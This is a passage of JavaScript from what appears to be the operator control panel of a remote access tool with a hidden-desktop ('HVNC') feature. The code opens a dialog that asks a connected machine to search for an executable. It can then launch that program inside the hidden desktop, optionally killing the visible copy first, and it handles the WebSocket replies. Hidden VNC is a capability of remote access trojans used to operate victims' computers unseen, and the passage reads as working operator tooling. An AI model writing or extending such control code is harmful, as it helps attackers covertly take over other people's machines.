    argsInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); run(); } });
  }

  let activeLookupOverlay = null;

  function showLookupExeModal() {
    if (activeLookupOverlay) activeLookupOverlay.remove();
    const overlay = document.createElement("div");
    overlay.id = "hvncLookupExeOverlay";
    overlay.className = "fixed inset-0 z-[100] flex items-center justify-center bg-black/60";
    overlay.innerHTML = `
      <div class="bg-slate-900 border border-slate-700 rounded-xl p-5 w-[480px] shadow-2xl flex flex-col" style="max-height:80vh">
        <div class="text-sm font-semibold text-slate-100 mb-3">Lookup Executable</div>
        <label class="block text-xs text-slate-400 mb-1">Exe filename (e.g. notepad.exe)</label>
        <div class="flex gap-2 mb-3">
          <input id="hvncLookupExeName" type="text" placeholder="notepad.exe"
            class="flex-1 bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 focus:outline-none focus:border-violet-500" />
          <button id="hvncLookupBtn" class="button primary text-sm px-4">
            <i class="fa-solid fa-magnifying-glass mr-1"></i>Lookup
          </button>
        </div>
        <div id="hvncLookupStatus" class="text-xs text-slate-500 mb-2 hidden">
          <i class="fa-solid fa-spinner fa-spin mr-1"></i>Searching…
        </div>
        <div id="hvncLookupResults" class="flex-1 overflow-y-auto min-h-[60px] max-h-[400px] bg-slate-950 border border-slate-800 rounded p-2">
          <div class="text-xs text-slate-600 text-center py-4">Results will appear here</div>
        </div>
        <div class="flex items-center mt-3">
          <label class="flex items-center gap-2 cursor-pointer select-none">
            <input type="checkbox" id="hvncLookupKill" class="accent-red-500 w-4 h-4 rounded" />
            <span class="text-xs text-slate-300">Kill before starting</span>
          </label>
          <div class="ml-auto">
            <button id="hvncLookupClose" class="button ghost text-sm">Close</button>
          </div>
        </div>
      </div>`;
    document.body.appendChild(overlay);
    activeLookupOverlay = overlay;

    const nameInput = document.getElementById("hvncLookupExeName");
    const lookupBtn = document.getElementById("hvncLookupBtn");
    const statusEl = document.getElementById("hvncLookupStatus");
    const resultsEl = document.getElementById("hvncLookupResults");
    nameInput.focus();

    function close() { overlay.remove(); activeLookupOverlay = null; }
    document.getElementById("hvncLookupClose").addEventListener("click", close);
    overlay.addEventListener("click", (e) => { if (e.target === overlay) close(); });

    function startLookup() {
      const exe = nameInput.value.trim();
      if (!exe) return;
      resultsEl.innerHTML = "";
      statusEl.classList.remove("hidden");
      lookupBtn.disabled = true;
      lookupBtn.classList.add("opacity-50");
      sendCmd("hvnc_lookup", { exe });
    }

    lookupBtn.addEventListener("click", startLookup);
    nameInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); startLookup(); } });
  }

  function handleLookupResult(msg) {
    const overlay = activeLookupOverlay;
    if (!overlay) return;
    const statusEl = document.getElementById("hvncLookupStatus");
    const resultsEl = document.getElementById("hvncLookupResults");
    const lookupBtn = document.getElementById("hvncLookupBtn");
    if (!resultsEl) return;

    if (msg.done) {
      if (statusEl) {
        statusEl.innerHTML = '<i class="fa-solid fa-check mr-1 text-emerald-400"></i>Search complete';
        setTimeout(() => statusEl.classList.add("hidden"), 3000);
      }
      if (lookupBtn) {
        lookupBtn.disabled = false;
        lookupBtn.classList.remove("opacity-50");
      }
      if (!resultsEl.querySelector("[data-lookup-path]")) {
        resultsEl.innerHTML = '<div class="text-xs text-slate-500 text-center py-4">No results found</div>';
      }
      return;
    }

    if (msg.path) {
      // Remove placeholder if present
      const placeholder = resultsEl.querySelector(":scope > div:not([data-lookup-path])");
      if (placeholder) placeholder.remove();

      const item = document.createElement("button");
      item.type = "button";
      item.dataset.lookupPath = msg.path;
      item.className = "w-full text-left px-2 py-1.5 rounded text-xs text-slate-200 hover:bg-violet-600/30 hover:text-violet-100 transition-colors font-mono truncate block";
      item.textContent = msg.path;
      item.title = "Click to start in HVNC: " + msg.path;
      item.addEventListener("click", () => {
        const killCheckbox = document.getElementById("hvncLookupKill");
        const killExe = killCheckbox?.checked ? msg.exe : "";
        sendCmd("hvnc_start_process", { path: '"' + msg.path + '"', kill_exe: killExe });
        item.classList.add("text-emerald-400");
        item.innerHTML = '<i class="fa-solid fa-check mr-1"></i>' + (killExe ? '(killed) ' : '') + msg.path;
      });
      resultsEl.appendChild(item);
      item.scrollIntoView({ block: "nearest" });
    }
  }

  function updateLatencyDisplay(ms) {
    lastLatencyMs = ms;
    if (latencyEl) {
      latencyEl.textContent = `${Math.round(ms)}ms`;
    }
  }

  connectWs();
  fetchClientInfo();
})();
